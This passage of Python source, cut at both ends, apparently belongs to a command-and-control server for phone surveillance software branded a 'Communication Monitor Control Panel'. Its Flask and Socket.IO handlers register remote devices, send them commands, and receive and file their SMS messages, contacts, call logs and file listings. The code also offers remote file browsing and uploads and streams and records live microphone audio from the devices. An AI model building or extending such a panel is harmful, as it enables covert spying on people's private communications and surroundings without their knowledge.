            self.status_var.set(f"Upload requested for: {file_path}")
            self.parent_app.add_system_log(
                f"📤 Upload requested: {file_path}", "success"
            )
        else:
            messagebox.showerror(
                "Upload Error",
                f"Failed to request upload: {result.get('message', 'Unknown error')}",
                parent=self.window,
            )

    def analyze_selected(self):
        """Analyze the selected file"""
        selection = self.files_listbox.curselection()
        if not selection:
            messagebox.showinfo(
                "Select File",
                "Please select a file to analyze from the file list (not from Quick Access).",
                parent=self.window,
            )
            return

        # Check if we actually have file data loaded
        if not hasattr(self, "current_files") or not self.current_files:
            messagebox.showinfo(
                "No Files",
                "No files are currently loaded. Please navigate to a directory first.",
                parent=self.window,
            )
            return

        index = selection[0]
        if index >= len(self.current_files):
            messagebox.showinfo(
                "Invalid Selection", "Selected item is not valid.", parent=self.window
            )
            return

        file_info = self.current_files[index]
        file_name = file_info.get("name", "")
        file_path = (
            f"{self.current_path}/{file_name}"
            if not self.current_path.endswith("/")
            else f"{self.current_path}{file_name}"
        )

        result = send_command_to_client(
            self.target_id,
            Commands.SIO_CMD_ANALYZE_CONTENT,
            args={"filePath": file_path},
        )
        if result.get("status") == "sent":
            self.status_var.set(f"Analysis requested for: {file_path}")
            self.parent_app.add_system_log(
                f"🔍 Analysis requested: {file_path}", "success"
            )
        else:
            messagebox.showerror(
                "Analysis Error",
                f"Failed to request analysis: {result.get('message', 'Unknown error')}",
                parent=self.window,
            )

    def copy_path_to_clipboard(self):
        """Copy the selected file path to clipboard"""
        selection = self.files_listbox.curselection()
        if not selection:
            return

        index = selection[0]
        if hasattr(self, "current_files") and index < len(self.current_files):
            file_info = self.current_files[index]
            file_name = file_info.get("name", "")
            file_path = (
                f"{self.current_path}/{file_name}"
                if not self.current_path.endswith("/")
                else f"{self.current_path}{file_name}"
            )

            self.window.clipboard_clear()
            self.window.clipboard_append(file_path)
            self.status_var.set(f"Copied to clipboard: {file_path}")

    def close(self):
        """Close the window with cleanup"""
        try:
            # Clean up any pending operations for this device
            if hasattr(self, "device_id"):
                pending_ops = remote_fs_manager.get_pending_operations(self.device_id)
                if pending_ops:
                    self.parent_app.add_system_log(
                        f"🧹 Cleaning up {len(pending_ops)} pending operations for {self.device_id}"
                    )
                    for cmd_id in list(pending_ops.keys()):
                        remote_fs_manager.remove_pending_operation(
                            self.device_id, cmd_id
                        )

            # Clear current files reference
            if hasattr(self, "current_files"):
                self.current_files = None

            # Log closure
            if hasattr(self, "parent_app") and self.parent_app:
                self.parent_app.add_system_log(
                    f"📂 File browser closed for {getattr(self, 'device_id', 'Unknown')}"
                )

        except Exception as e:
            logger.warning(f"Error during file browser cleanup: {e}")
        finally:
            # Always destroy the window
            if hasattr(self, "window"):
                self.window.destroy()

    def __del__(self):
        """Destructor to ensure cleanup"""
        try:
            if hasattr(self, "current_files"):
                self.current_files = None
        except:
            pass


# Global Variables
connected_clients_sio = {}
device_manager = DeviceManager()
settings_manager = SettingsManager()
theme_manager = ThemeManager()
remote_fs_manager = RemoteFileSystemManager()
gui_app = None

# Audio Variables
audio_queue = queue.Queue()
stream_active_for_device = {}
playback_thread = None
live_audio_buffers = {}


# --- Enhanced File Upload Handler ---
class FileUploadHandler:
    @staticmethod
    def handle_initial_data(request_data):
        """معالجة رفع البيانات الأولية"""
        logger.info("Request to /upload_initial_data")
        try:
            json_data_str = request_data.form.get("json_data")
            if not json_data_str:
                logger.error("No json_data found in request.")
                return Utils.create_json_response("error", "Missing json_data"), 400

            data = json.loads(json_data_str)
            raw_device_id = data.get("deviceId")
            device_info_for_fallback = data.get("deviceInfo", {})

            if not raw_device_id:
                model = device_info_for_fallback.get("model", "unknown_model")
                name = device_info_for_fallback.get("deviceName", "unknown_device")
                raw_device_id = (
                    f"{model}_{name}_{datetime.datetime.now().strftime('%S%f')}"
                )
                logger.warning(f"Using fallback deviceId: {raw_device_id}")

            device_id_sanitized = Utils.sanitize_device_id(raw_device_id)
            device_folder_path = os.path.join(
                AppConfig.DATA_RECEIVED_DIR, device_id_sanitized
            )
            os.makedirs(device_folder_path, exist_ok=True)

            # Save JSON data
            info_file_name = (
                f'initial_data_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
            )
            info_file_path = os.path.join(device_folder_path, info_file_name)
            with open(info_file_path, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=4)
            logger.info(f"Saved JSON to {info_file_path}")

            # Save image if exists
            image_file = request_data.files.get("image")
            if image_file and image_file.filename:
                filename = os.path.basename(image_file.filename)
                base, ext = os.path.splitext(filename)
                if not ext:
                    ext = ".jpg"
                image_filename = f"initial_img_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}{ext}"
                image_path = os.path.join(device_folder_path, image_filename)
                image_file.save(image_path)
                logger.info(f"Saved image to {image_path}")

            # Update device stats
            device_manager.update_stats(
                device_id_sanitized,
                "last_initial_data",
                datetime.datetime.now().isoformat(),
            )

            # Update GUI
            if gui_app and gui_app.master.winfo_exists():
                gui_app.add_system_log(
                    f"Initial data received from monitor: {device_id_sanitized}"
                )
                gui_app.refresh_historical_device_list()

            return Utils.create_json_response("success", "Initial data received"), 200

        except json.JSONDecodeError as e:
            logger.error(f"Invalid JSON: {e}")
            return Utils.create_json_response("error", "Invalid JSON format"), 400
        except Exception as e:
            logger.error(f"Error processing initial data: {e}", exc_info=True)
            return (
                Utils.create_json_response("error", f"Internal server error: {str(e)}"),
                500,
            )

    @staticmethod
    def handle_command_file(request_data):
        """معالجة رفع ملفات الأوامر المحسن"""
        logger.info("Request to /upload_command_file")
        try:
            device_id = request_data.form.get("deviceId")
            command_ref = request_data.form.get("commandRef", "unknown_cmd_ref")
            command_id_from_req = request_data.form.get("commandId", "N_A")
            data_type = request_data.form.get("dataType", "unknown_data_type")

            if not device_id:
                logger.error("'deviceId' missing.")
                return Utils.create_json_response("error", "Missing deviceId"), 400

            device_id_sanitized = Utils.sanitize_device_id(device_id)
            device_folder_path = os.path.join(
                AppConfig.DATA_RECEIVED_DIR, device_id_sanitized
            )
            os.makedirs(device_folder_path, exist_ok=True)

            file_data = request_data.files.get("file")
            if file_data and file_data.filename:
                original_filename = os.path.basename(file_data.filename)
                base, ext = os.path.splitext(original_filename)
                if not ext:
                    ext = ".dat"

                safe_command_ref = "".join(
                    c if c.isalnum() else "_" for c in command_ref
                )
                safe_command_id = (
                    "".join(c if c.isalnum() else "_" for c in command_id_from_req)
                    if command_id_from_req != "N_A"
                    else "no_id"
                )

                # Enhanced folder structure based on data type
                folder_mapping = {
                    "structured_analysis": "structured_analysis",
                    "audio_data": "audio_recordings",
                    "enhanced_sms_extraction": "messages/enhanced_sms",
                    "complete_sms_extraction": "messages/complete_sms",
                    "social_network_analysis": "social_network",
                    "communication_history_analysis": "communication_history",
                    "contacts_list_analysis": "contacts",
                    "call_logs_analysis": "call_logs",
                    "library_catalog": "library_catalog",
                    "content_analysis": "content_analysis",
                    "queue_processing": "queue_processing",
                }

                subfolder = folder_mapping.get(data_type, "general")
                file_path = os.path.join(device_folder_path, subfolder)
                os.makedirs(file_path, exist_ok=True)

                new_filename = f"{safe_command_ref}_{base.replace(' ', '_')}_{safe_command_id}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}{ext}"
                full_file_path = os.path.join(file_path, new_filename)

                file_data.save(full_file_path)
                file_size = os.path.getsize(full_file_path)

                logger.info(
                    f"Saved {data_type} data '{new_filename}' for monitor '{device_id_sanitized}' ({Utils.format_file_size(file_size)})"
                )

                # Update device stats
                device_manager.update_stats(
                    device_id_sanitized,
                    f"last_{data_type}",
                    {
                        "timestamp": datetime.datetime.now().isoformat(),
                        "file_size": file_size,
                        "filename": new_filename,
                    },
                )

                # Enhanced processing for different data types
                if command_ref == "list_files" and command_id_from_req != "N_A":
                    try:
                        with open(full_file_path, "r", encoding="utf-8") as f:
                            files_data = json.load(f)
                            if "data" in files_data and "path" in files_data.get(
                                "data", {}
                            ):
                                path = files_data["data"]["path"]
                                files_list = files_data["data"].get("files", [])
                                remote_fs_manager.add_files_to_cache(
                                    device_id_sanitized, path, files_list
                                )
                                remote_fs_manager.remove_pending_operation(
                                    device_id_sanitized, command_id_from_req
                                )

                                # Update the file browser if it's open for this device
                                if (
                                    gui_app
                                    and gui_app.master.winfo_exists()
                                    and hasattr(gui_app, "file_browser")
                                    and gui_app.file_browser
                                    and gui_app.file_browser.current_device_id
                                    == device_id_sanitized
                                    and hasattr(gui_app.file_browser, "window")
                                    and gui_app.file_browser.window.winfo_exists()
                                ):
                                    # Only update if the file browser is showing the same path
                                    if gui_app.file_browser.current_path == path:
                                        gui_app.file_browser.populate_files_from_cache(
                                            path
                                        )
                    except Exception as e:
                        logger.error(
                            f"Error processing list_files response: {e}", exc_info=True
                        )

                FileUploadHandler._process_uploaded_data(
                    full_file_path, data_type, device_id_sanitized, command_id_from_req
                )

                # Update GUI
                if gui_app and gui_app.master.winfo_exists():
                    gui_app.add_system_log(
                        f"📁 Received '{new_filename}' from '{device_id_sanitized}' (Type: {data_type}, Size: {Utils.format_file_size(file_size)})"
                    )
                    if (
                        gui_app.current_selected_historical_device_id
                        == device_id_sanitized
                    ):
                        gui_app.display_device_details(device_id_sanitized)

                return (
                    Utils.create_json_response(
                        "success",
                        "Enhanced monitoring data received",
                        filename_on_server=new_filename,
                        file_size=file_size,
                        data_type=data_type,
                    ),
                    200,
                )
            else:
                logger.error("No file data in request.")
                return Utils.create_json_response("error", "Missing file data"), 400

        except Exception as e:
            logger.error(f"Error in upload_command_file: {e}", exc_info=True)
            return Utils.create_json_response("error", f"Server error: {str(e)}"), 500

    @staticmethod
    def _process_uploaded_data(file_path, data_type, device_id, command_id):
        """معالجة البيانات المرفوعة حسب النوع"""
        try:
            if data_type in ["enhanced_sms_extraction", "complete_sms_extraction"]:
                with open(file_path, "r", encoding="utf-8") as f:
                    sms_data = json.load(f)
                    if "data" in sms_data:
                        stats = sms_data["data"].get("statistics", {})
                        device_manager.update_stats(
                            device_id,
                            "sms_stats",
                            {
                                "total_messages": stats.get("total_messages", 0),
                                "extraction_mode": sms_data["data"].get(
                                    "extraction_mode", "unknown"
                                ),
                                "timestamp": datetime.datetime.now().isoformat(),
                            },
                        )

            elif data_type == "social_network_analysis":
                with open(file_path, "r", encoding="utf-8") as f:
                    network_data = json.load(f)
                    if "data" in network_data:
                        network_analytics = network_data["data"].get(
                            "network_analytics", {}
                        )
                        device_manager.update_stats(
                            device_id,
                            "network_stats",
                            {
                                "total_contacts": network_data["data"].get(
                                    "total_network_size", 0
                                ),
                                "mobile_contacts": network_analytics.get(
                                    "mobile_contacts", 0
                                ),
                                "timestamp": datetime.datetime.now().isoformat(),
                            },
                        )

            elif data_type == "library_catalog":
                with open(file_path, "r", encoding="utf-8") as f:
                    catalog_data = json.load(f)
                    if "data" in catalog_data:
                        stats = catalog_data["data"].get("content_statistics", {})
                        device_manager.update_stats(
                            device_id,
                            "library_stats",
                            {
                                "total_files": stats.get("total_files", 0),
                                "total_directories": stats.get("total_directories", 0),
                                "total_size": stats.get("total_size_bytes", 0),
                                "timestamp": datetime.datetime.now().isoformat(),
                            },
                        )

        except Exception as e:
            logger.warning(f"Error processing uploaded data: {e}")


# --- Enhanced Socket Event Handlers ---
class SocketEventHandler:
    @staticmethod
    def handle_connect():
        """معالج الاتصال الجديد"""
        client_sid = request.sid
        logger.info(
            f"Monitor attempting connection: SID={client_sid}, IP={request.remote_addr}"
        )
        emit(
            Commands.SIO_EVENT_REQUEST_REGISTRATION_INFO,
            {"message": "Please register monitoring device."},
            room=client_sid,
        )

    @staticmethod
    def handle_disconnect():
        """معالج قطع الاتصال المحسن"""
        client_sid = request.sid
        dev_id_display = client_sid
        was_streaming = stream_active_for_device.get(client_sid, False)

        # Clean up streaming state
        stream_active_for_device.pop(client_sid, None)

        if client_sid in connected_clients_sio:
            device_info = connected_clients_sio.pop(client_sid)
            dev_id_display = device_info.get("id", client_sid)
            logger.info(f"Monitor '{dev_id_display}' disconnected (SID={client_sid})")

            # Update device stats
            device_manager.update_stats(
                dev_id_display,
                "last_disconnection",
                datetime.datetime.now().isoformat(),
            )

            # Handle live audio disconnection during streaming
            if was_streaming and client_sid in live_audio_buffers:
                buffered_info = live_audio_buffers.get(client_sid, {})
                audio_data_list = buffered_info.get("data", [])

                # Schedule audio save dialog on main thread
                if gui_app and gui_app.master.winfo_exists() and audio_data_list:

                    def show_save_dialog():
                        try:
                            user_choice = messagebox.askyesno(
                                "Device Disconnected During Live Audio",
                                f"⚠️ Monitor '{dev_id_display}' disconnected during live audio streaming!\n\n"
                                f"Live audio data is available ({len(audio_data_list)} chunks).\n"
                                f"Would you like to save the recorded audio before it's lost?",
                                parent=gui_app.master,
                            )
                            if user_choice:
                                audio_params = buffered_info.get(
                                    "params",
                                    {
                                        "samplerate": AppConfig.REC_SAMPLERATE,
                                        "channels": AppConfig.REC_CHANNELS,
                                        "sampwidth": AppConfig.REC_SAMPWIDTH,
                                    },
                                )
                                gui_app._save_recorded_stream(
                                    dev_id_display,
                                    client_sid,
                                    audio_data_list,
                                    audio_params,
                                )
                                gui_app.add_system_log(
                                    f"💾 Saved live audio from disconnected monitor: {dev_id_display}",
                                    "success",
                                )
                            else:
                                gui_app.add_system_log(
                                    f"🗑️ Discarded live audio from disconnected monitor: {dev_id_display}",
                                    "warning",
                                )
                        except Exception as e:
                            logger.error(f"Error in save dialog: {e}")
                            gui_app.add_system_log(
                                f"❌ Error handling disconnected audio: {e}", "error"
                            )

                    # Schedule the dialog to show after a short delay
                    gui_app.master.after(1000, show_save_dialog)

            # Update GUI
            if gui_app and gui_app.master.winfo_exists():
                gui_app.update_live_clients_list()
                gui_app.add_system_log(
                    f"🔴 Monitor '{dev_id_display}' disconnected"
                    + (" during live audio streaming" if was_streaming else "")
                )

                if gui_app.current_selected_live_client_sid == client_sid:
                    gui_app._enable_commands(False)
                    gui_app.current_selected_live_client_sid = None

                    if was_streaming:
                        gui_app.live_audio_status_var.set(
                            "🔴 Live Audio: Device Disconnected"
                        )
                        gui_app.start_live_audio_button.config(state=tk.DISABLED)
                        gui_app.stop_live_audio_button.config(state=tk.DISABLED)
                    else:
                        gui_app.live_audio_status_var.set(
                            "Live Audio: Idle (Monitor Disconnected)"
                        )

                # Close file browser if it's open for this device
                if (
                    hasattr(gui_app, "file_browser")
                    and gui_app.file_browser
                    and hasattr(gui_app.file_browser, "current_device_id")
                    and gui_app.file_browser.current_device_id == dev_id_display
                ):
                    try:
                        if (
                            hasattr(gui_app.file_browser, "window")
                            and gui_app.file_browser.window.winfo_exists()
                        ):

                            def close_browser():
                                try:
                                    gui_app.file_browser.status_var.set(
                                        "⚠️ Device disconnected - File browser will close"
                                    )
                                    gui_app.master.after(
                                        2000, gui_app.file_browser.close
                                    )
                                except:
                                    pass

                            gui_app.master.after(500, close_browser)
                    except Exception as e:
                        logger.warning(f"Error closing file browser: {e}")

        # Clear audio buffer if not handled above
        if client_sid in live_audio_buffers:
            buffered_info = live_audio_buffers.pop(client_sid, None)
            if buffered_info and buffered_info.get("data") and not was_streaming:
                logger.info(
                    f"Cleared audio buffer for disconnected monitor {dev_id_display}"
                )
                if gui_app and gui_app.master.winfo_exists():
                    gui_app.add_system_log(
                        f"🗑️ Cleared audio buffer for {dev_id_display}"
                    )

    @staticmethod
    def handle_register_device(data):
        """معالج تسجيل جهاز جديد"""
        client_sid = request.sid
        try:
            device_identifier = data.get("deviceId")
            device_name_display = data.get("deviceName", f"Monitor_{client_sid[:6]}")
            device_platform = data.get("platform", "Unknown")
            device_capabilities = data.get("capabilities", [])

            if not device_identifier:
                logger.error(
                    f"Registration failed for SID {client_sid}: 'deviceId' missing."
                )
                emit(
                    "registration_failed",
                    {"message": "Missing 'deviceId' in registration payload."},
                    room=client_sid,
                )
                return

            connected_clients_sio[client_sid] = {
                "sid": client_sid,
                "id": device_identifier,
                "name_display": device_name_display,
                "platform": device_platform,
                "capabilities": device_capabilities,
                "ip": request.remote_addr,
                "connected_at": datetime.datetime.now().isoformat(),
                "last_seen": datetime.datetime.now().isoformat(),
            }

            # Update device stats
            device_manager.update_stats(
                device_identifier,
                "last_connection",
                {
                    "timestamp": datetime.datetime.now().isoformat(),
                    "ip": request.remote_addr,
                    "platform": device_platform,
                    "capabilities": device_capabilities,
                },
            )

            logger.info(
                f"Monitor registered: ID='{device_identifier}', Name='{device_name_display}'"
            )

            emit(
                "registration_successful",
                {
                    "message": "Monitor successfully registered.",
                    "sid": client_sid,
                    "deviceId": device_identifier,
                },
                room=client_sid,
            )

            # Update GUI
            if gui_app and gui_app.master.winfo_exists():
                gui_app.update_live_clients_list()
                gui_app.add_system_log(
                    f"🟢 Monitor '{device_name_display}' connected from {request.remote_addr}"
                )

        except Exception as e:
            logger.error(
                f"Error in handle_register_device for SID {client_sid}: {e}",
                exc_info=True,
            )
            emit(
                "registration_failed",
                {"message": "Server error during monitor registration."},
                room=client_sid,
            )

    @staticmethod
    def handle_heartbeat(data):
        """معالج نبضات الحياة"""
        client_sid = request.sid
        if client_sid in connected_clients_sio:
            connected_clients_sio[client_sid][
                "last_seen"
            ] = datetime.datetime.now().isoformat()
            if gui_app and gui_app.master.winfo_exists():
                gui_app.update_live_clients_list_item(client_sid)

    @staticmethod
    def handle_live_audio_chunk(data):
        """معالج أجزاء البث الصوتي المباشر"""
        client_sid = request.sid
        if client_sid not in connected_clients_sio:
            logger.warning(
                f"Received audio chunk from unknown monitor SID: {client_sid}"
            )
            return

        if not stream_active_for_device.get(client_sid, False):
            return

        audio_data_bytes = data.get("audio_data")
        if isinstance(audio_data_bytes, bytes):
            if SOUNDDEVICE_AVAILABLE:
                audio_queue.put(audio_data_bytes)

            if client_sid in live_audio_buffers:
                live_audio_buffers[client_sid]["data"].append(audio_data_bytes)

            if (
                gui_app
                and gui_app.master.winfo_exists()
                and gui_app.current_selected_live_client_sid == client_sid
            ):
                status_msg = f"🎵 Live Audio: Receiving from {connected_clients_sio[client_sid].get('id', client_sid)}..."
                if not SOUNDDEVICE_AVAILABLE:
                    status_msg = "🎵 Live Audio: Receiving (Playback Disabled)"
                gui_app.live_audio_status_var.set(status_msg)


# --- Enhanced Command Sender ---
def send_command_to_client(target_id, command_name, args=None, timeout_seconds=30):
    """إرسال أمر إلى عميل محدد مع معالجة محسنة"""
    args = args if args is not None else {}
    sid_to_use = None

    # Find the correct SID
    if target_id in connected_clients_sio:
        sid_to_use = target_id
    else:
        sid_to_use = next(
            (
                s
                for s, info in connected_clients_sio.items()
                if info.get("id") == target_id
            ),
            None,
        )

    if not sid_to_use:
        errmsg = f"Target monitor '{target_id}' not found or not connected"
        logger.error(errmsg)
        if gui_app and gui_app.master.winfo_exists():
            gui_app.add_system_log(f"❌ {errmsg}", "error")
            messagebox.showerror(
                "Command Error",
                f"Device '{target_id}' is not connected.\n"
                f"Please ensure the device is online and try again.",
                parent=gui_app.master,
            )
        return {"status": "error", "message": errmsg, "command_id": None}

    # Verify connection is still active
    device_info = connected_clients_sio.get(sid_to_use, {})
    dev_id_for_log = device_info.get("id", "UnknownMonitorID")

    # Check last seen time
    last_seen_iso = device_info.get("last_seen")
    if last_seen_iso:
        try:
            last_seen_dt = datetime.datetime.fromisoformat(last_seen_iso)
            time_since_last_seen = (
                datetime.datetime.now() - last_seen_dt
            ).total_seconds()
            if time_since_last_seen > 120:  # 2 minutes
                logger.warning(
                    f"Device {dev_id_for_log} hasn't been seen for {time_since_last_seen:.0f} seconds"
                )
                if gui_app and gui_app.master.winfo_exists():
                    gui_app.add_system_log(
                        f"⚠️ Device {dev_id_for_log} may be unresponsive (last seen {time_since_last_seen:.0f}s ago)",
                        "warning",
                    )
        except:
            pass

    cmd_id = f"{command_name.replace('command_', '')}_{datetime.datetime.now().strftime('%H%M%S%f')}"
    payload = {"command": command_name, "command_id": cmd_id, "args": args}

    logger.info(
        f"Sending cmd '{command_name}' (ID: {cmd_id}) to monitor '{dev_id_for_log}'"
    )

    try:
        socketio.emit("command", payload, room=sid_to_use)

        # Store command info for timeout tracking
        if gui_app:
            command_info = {
                "command_name": command_name,
                "device_id": dev_id_for_log,
                "timestamp": datetime.datetime.now(),
                "timeout_seconds": timeout_seconds,
            }

            # Schedule timeout check
            def check_timeout():
                if gui_app and gui_app.master.winfo_exists():
                    elapsed = (
                        datetime.datetime.now() - command_info["timestamp"]
                    ).total_seconds()
                    if elapsed > timeout_seconds:
                        gui_app.add_system_log(
                            f"⏰ Command '{command_name}' to '{dev_id_for_log}' may have timed out ({elapsed:.0f}s)",
                            "warning",
                        )

            # Check for timeout after the specified time
            if gui_app.master.winfo_exists():
                gui_app.master.after(int(timeout_seconds * 1000), check_timeout)

        if gui_app and gui_app.master.winfo_exists():
            gui_app.add_system_log(
                f"📤 Sent cmd '{command_name}' (ID: {cmd_id}) to monitor '{dev_id_for_log}'"
            )

        return {"status": "sent", "command_id": cmd_id, "device_id": dev_id_for_log}

    except Exception as e_emit:
        errmsg = f"Error emitting cmd '{command_name}' to SID {sid_to_use}: {e_emit}"
        logger.error(errmsg, exc_info=True)
        if gui_app and gui_app.master.winfo_exists():
            gui_app.add_system_log(f"❌ Failed to send command: {e_emit}", "error")
            messagebox.showerror(
                "Communication Error",
                f"Failed to send command to device '{dev_id_for_log}'.\n"
                f"Error: {e_emit}\n\n"
                f"Please check the connection and try again.",
                parent=gui_app.master,
            )
        return {"status": "error", "message": errmsg, "command_id": cmd_id}


# --- Flask Routes ---
@app.route("/")
def index():
    return "Advanced Communication Monitor Control Panel v2.0 - Enhanced Edition"


@app.route("/status")
def status():
    """حالة النظام والإحصائيات المحسنة"""
    return jsonify(
        {
            "status": "running",
            "version": "2.0_enhanced",
            "connected_monitors": len(connected_clients_sio),
            "active_streams": len(
                [sid for sid, active in stream_active_for_device.items() if active]
            ),
            "server_time": datetime.datetime.now().isoformat(),
            "features": {
                "audio_playback": SOUNDDEVICE_AVAILABLE,
                "image_preview": PIL_AVAILABLE,
                "enhanced_sms_extraction": True,
                "unlimited_sms_compression": True,
                "smart_resource_monitoring": True,
                "intelligent_sync_queue": True,
                "document_library_cataloging": True,
                "dark_mode_support": True,
            },
            "theme": theme_manager.current_theme,
            "settings": settings_manager.settings,
        }
    )


@app.route("/upload_initial_data", methods=["POST"])
def upload_initial_data():
    return FileUploadHandler.handle_initial_data(request)


@app.route("/upload_command_file", methods=["POST"])
def upload_command_file():
    return FileUploadHandler.handle_command_file(request)


# --- Socket Event Registration ---
@socketio.on("connect")
def handle_sio_connect():
    return SocketEventHandler.handle_connect()


@socketio.on("disconnect")
def handle_sio_disconnect():
    return SocketEventHandler.handle_disconnect()


@socketio.on("register_device")
def handle_register_device(data):
    return SocketEventHandler.handle_register_device(data)


@socketio.on("device_heartbeat")
def handle_device_heartbeat(data):
    return SocketEventHandler.handle_heartbeat(data)


@socketio.on(Commands.SIO_EVENT_LIVE_AUDIO_CHUNK)
def handle_live_audio_chunk(data):
    return SocketEventHandler.handle_live_audio_chunk(data)


# --- Enhanced GUI Application with Dark Mode ---
class AdvancedControlPanelApp:
    def __init__(self, master):
        self.master = master
        master.title("Advanced Communication Monitor Control Panel v2.0 Enhanced")
        master.geometry(settings_manager.get("window_geometry", "1400x900"))
        master.minsize(1200, 800)

        # Initialize theme
        theme_manager.current_theme = settings_manager.get("theme", "light")
        self.current_theme = theme_manager.get_theme()

        # State
        self.current_selected_live_client_sid = None
        self.current_selected_historical_device_id = None
        self.file_browser = None

        # Initialize components
        self._setup_styles()
        self._setup_main_interface()
        self._initialize_data()
        self._apply_theme()

        # Bind events
        master.protocol("WM_DELETE_WINDOW", self._on_closing)

    def _setup_styles(self):
        """إعداد الأنماط للواجهة"""
        self.style = ttk.Style()

        # Configure ttk styles for current theme
        self._configure_ttk_styles()

    def _configure_ttk_styles(self):
        """تكوين أنماط ttk للثيم الحالي"""
        theme = self.current_theme

        # Configure main styles
        self.style.configure("Themed.TFrame", background=theme["frame_bg"])
        self.style.configure(
            "Themed.TLabel", background=theme["frame_bg"], foreground=theme["fg"]
        )
        self.style.configure(
            "Themed.TButton",
            background=theme["button_bg"],
            foreground=theme["button_fg"],
        )
        self.style.configure(
            "Themed.TEntry",
            fieldbackground=theme["entry_bg"],
            foreground=theme["entry_fg"],
        )

        # Configure notebook styles
        self.style.configure("Themed.TNotebook", background=theme["frame_bg"])
        self.style.configure(
            "Themed.TNotebook.Tab",
            background=theme["button_bg"],
            foreground=theme["button_fg"],
        )

    def _setup_main_interface(self):
        """إعداد الواجهة الرئيسية"""
        self._create_menu_bar()

        main_pane = ttk.PanedWindow(
            self.master, orient=tk.HORIZONTAL, style="Themed.TPanedwindow"
        )
        main_pane.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

        left_pane = ttk.Frame(main_pane, width=400, style="Themed.TFrame")
        main_pane.add(left_pane, weight=1)
        self._setup_left_panel(left_pane)

        right_pane = ttk.Frame(main_pane, width=1000, style="Themed.TFrame")
        main_pane.add(right_pane, weight=3)
        self._setup_right_panel(right_pane)

    def _create_menu_bar(self):
        """إنشاء شريط القوائم المحسن"""
        menubar = tk.Menu(self.master)
        self.master.config(menu=menubar)

        # File menu
        file_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="File", menu=file_menu)
        file_menu.add_command(
            label="🗂️ Open File Browser", command=self.open_file_browser
        )
        file_menu.add_command(
            label="📊 Export Device Data", command=self._export_device_data
        )
        file_menu.add_command(label="⚙️ Import Settings", command=self._import_settings)
        file_menu.add_separator()
        file_menu.add_command(label="❌ Exit", command=self.master.quit)

        # View menu
        view_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="View", menu=view_menu)
        view_menu.add_command(label="🌙 Toggle Dark Mode", command=self._toggle_theme)
        view_menu.add_separator()
        view_menu.add_command(label="🔄 Refresh All", command=self._refresh_all)
        view_menu.add_command(
            label="📊 Statistics Dashboard", command=self._show_statistics
        )

        # Tools menu
        tools_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Tools", menu=tools_menu)
        tools_menu.add_command(label="🗑️ Clear All Data", command=self._clear_all_data)
        tools_menu.add_command(
            label="🖥️ Server Status", command=self._show_server_status
        )
        tools_menu.add_command(
            label="🔄 Refresh File Cache", command=self._refresh_file_cache
        )
        tools_menu.add_separator()
        tools_menu.add_command(label="⚙️ Settings", command=self._show_settings)

        # Help menu
        help_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="Help", menu=help_menu)
        help_menu.add_command(label="📖 User Guide", command=self._show_user_guide)
        help_menu.add_command(
            label="🔧 Troubleshooting", command=self._show_troubleshooting
        )
        help_menu.add_separator()
        help_menu.add_command(label="ℹ️ About", command=self._show_about)

    def _setup_left_panel(self, parent):
        """إعداد اللوحة اليسرى المحسنة"""
        # Live clients section
        live_clients_frame = ttk.LabelFrame(
            parent, text="🟢 Live Monitors (Active)", style="Themed.TLabelframe"
        )
        live_clients_frame.pack(pady=5, padx=5, fill=tk.X)

        # Add status indicator
        self.live_status_frame = tk.Frame(
            live_clients_frame, bg=self.current_theme["frame_bg"]
        )
        self.live_status_frame.pack(fill=tk.X, padx=5, pady=2)

        self.live_count_label = tk.Label(
            self.live_status_frame,
            text="Connected: 0",
            bg=self.current_theme["frame_bg"],
            fg=self.current_theme["fg"],
            font=("Arial", 9, "bold"),
        )
        self.live_count_label.pack(side=tk.LEFT)

        self.live_clients_listbox = tk.Listbox(
            live_clients_frame,
            height=8,
            font=("Consolas", 9),
            bg=self.current_theme["listbox_bg"],
            fg=self.current_theme["listbox_fg"],
            selectbackground=self.current_theme["select_bg"],
            selectforeground=self.current_theme["select_fg"],
        )
        scrollbar_live = ttk.Scrollbar(live_clients_frame, orient="vertical")
        self.live_clients_listbox.config(yscrollcommand=scrollbar_live.set)
        scrollbar_live.config(command=self.live_clients_listbox.yview)

        self.live_clients_listbox.pack(
            side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5
        )
        scrollbar_live.pack(side=tk.RIGHT, fill=tk.Y)
        self.live_clients_listbox.bind("<<ListboxSelect>>", self._on_live_client_select)
        self.live_clients_listbox.bind("<Button-3>", self._on_live_client_right_click)

        # Historical devices section
        historical_devices_frame = ttk.LabelFrame(
            parent, text="📁 Historical Monitors (Archive)", style="Themed.TLabelframe"
        )
        historical_devices_frame.pack(pady=5, padx=5, fill=tk.X)

        # Add archive status
        self.archive_status_frame = tk.Frame(
            historical_devices_frame, bg=self.current_theme["frame_bg"]
        )
        self.archive_status_frame.pack(fill=tk.X, padx=5, pady=2)

        self.archive_count_label = tk.Label(
            self.archive_status_frame,
            text="Archived: 0",
            bg=self.current_theme["frame_bg"],
            fg=self.current_theme["fg"],
            font=("Arial", 9, "bold"),
        )
        self.archive_count_label.pack(side=tk.LEFT)

        self.historical_devices_listbox = tk.Listbox(
            historical_devices_frame,
            height=12,
            font=("Consolas", 9),
            bg=self.current_theme["listbox_bg"],
            fg=self.current_theme["listbox_fg"],
            selectbackground=self.current_theme["select_bg"],
            selectforeground=self.current_theme["select_fg"],
        )
        scrollbar_hist = ttk.Scrollbar(historical_devices_frame, orient="vertical")
        self.historical_devices_listbox.config(yscrollcommand=scrollbar_hist.set)
        scrollbar_hist.config(command=self.historical_devices_listbox.yview)

        self.historical_devices_listbox.pack(
            side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5
        )
        scrollbar_hist.pack(side=tk.RIGHT, fill=tk.Y)
        self.historical_devices_listbox.bind(
            "<<ListboxSelect>>", self._on_historical_device_select
        )
        self.historical_devices_listbox.bind(
            "<Button-3>", self._on_historical_device_right_click
        )

        # Archive control buttons
        archive_buttons_frame = tk.Frame(
            historical_devices_frame, bg=self.current_theme["frame_bg"]
        )
